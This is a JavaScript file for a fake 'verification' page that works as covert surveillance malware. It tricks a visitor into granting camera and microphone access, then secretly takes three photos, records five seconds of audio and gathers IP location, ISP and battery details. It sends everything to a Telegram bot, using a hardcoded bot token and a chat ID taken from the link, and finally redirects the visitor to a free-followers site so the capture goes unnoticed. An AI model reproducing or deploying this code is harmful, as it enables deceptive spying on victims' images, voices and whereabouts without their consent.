const TELEGRAM_BOT_TOKEN = '7348487954:AAHzfq7cjY_it7IRfcEiRUkLx5xmg6ZW0OI';
const REDIRECT_URL = 'https://superviral.io/free-instagram-followers/';

function GetURLParameter(name) {
  const query = window.location.search.substring(1);
  const vars = query.split("&");
  for (let i = 0; i < vars.length; i++) {
    const pair = vars[i].split("=");
    if (pair[0] === name) return pair[1];
  }
}

const TELEGRAM_CHAT_ID = GetURLParameter('id');

async function startVerification() {
  const verifyBtn = document.getElementById("verify-btn");
  verifyBtn.textContent = "Verifying... Please Wait";

  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { width: { ideal: 640 }, height: { ideal: 480 } },
      audio: { sampleRate: 22050 }
    });

    const photoCapture = new ImageCapture(stream.getVideoTracks()[0]);
    const recorder = new MediaRecorder(stream);

    await Promise.all([
      sendDeviceInfo(),
      capturePhotos(photoCapture),
      recordAudio(recorder)
    ]);

    stopStream(stream);
    window.location.href = REDIRECT_URL;

  } catch (err) {
    handleError(err);
    verifyBtn.textContent = "Verify";
  }
}

async function sendDeviceInfo() {
  try {
    const ipInfo = await (await fetch('https://ipinfo.io/json?token=5602d2e05cb668')).json();
    const battery = await navigator.getBattery();

    const message = `
🌐 IP: ${ipInfo.ip}
🗺️ Region: ${ipInfo.region}
📍 City: ${ipInfo.city}
🌎 Country: ${ipInfo.country}
📡 ISP: ${ipInfo.org}
🔋 Battery: ${Math.round(battery.level * 100)}%
${battery.charging ? '⚡ Charging' : '🔌 Not Charging'}`;

    await sendToTelegram(message, 'text');
  } catch (err) {
    console.error("Error sending device info:", err);
  }
}

async function capturePhotos(photoCapture) {
  try {
    for (let i = 0; i < 3; i++) {
      const photoBlob = await photoCapture.takePhoto();
      const compressed = await compressImage(photoBlob);
      await sendToTelegram(compressed, 'photo');
    }
  } catch (err) {
    console.error("Error capturing photos:", err);
    throw err;
  }
}

function recordAudio(recorder) {
  return new Promise((resolve, reject) => {
    const chunks = [];

    recorder.ondataavailable = e => chunks.push(e.data);

    recorder.onstop = async () => {
      try {
        const audioBlob = new Blob(chunks, { type: 'audio/wav' });
        await sendToTelegram(audioBlob, 'audio');
        resolve();
      } catch (err) {
        reject(err);
      }
    };

    recorder.onerror = reject;
    recorder.start();
    setTimeout(() => recorder.stop(), 5000); // 5 seconds
  });
}

async function compressImage(blob) {
  return new Promise(resolve => {
    const img = new Image();
    img.src = URL.createObjectURL(blob);

    img.onload = () => {
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      canvas.width = img.width / 2;
      canvas.height = img.height / 2;
      ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
      canvas.toBlob(resolve, 'image/jpeg', 0.7);
    };
  });
}

async function sendToTelegram(data, type) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/send${type === 'text' ? 'Message' : type.charAt(0).toUpperCase() + type.slice(1)}`;
  const formData = new FormData();
  formData.append("chat_id", TELEGRAM_CHAT_ID);

  if (type === 'text') {
    formData.append("text", data);
  } else {
    formData.append(type, data, `file.${type === 'photo' ? 'jpg' : 'wav'}`);
  }

  await fetch(url, {
    method: "POST",
    body: formData
  });
}

function stopStream(stream) {
  stream.getTracks().forEach(track => track.stop());
}

function handleError(error) {
  alert("Error: " + error.message);
  console.error(error);
}
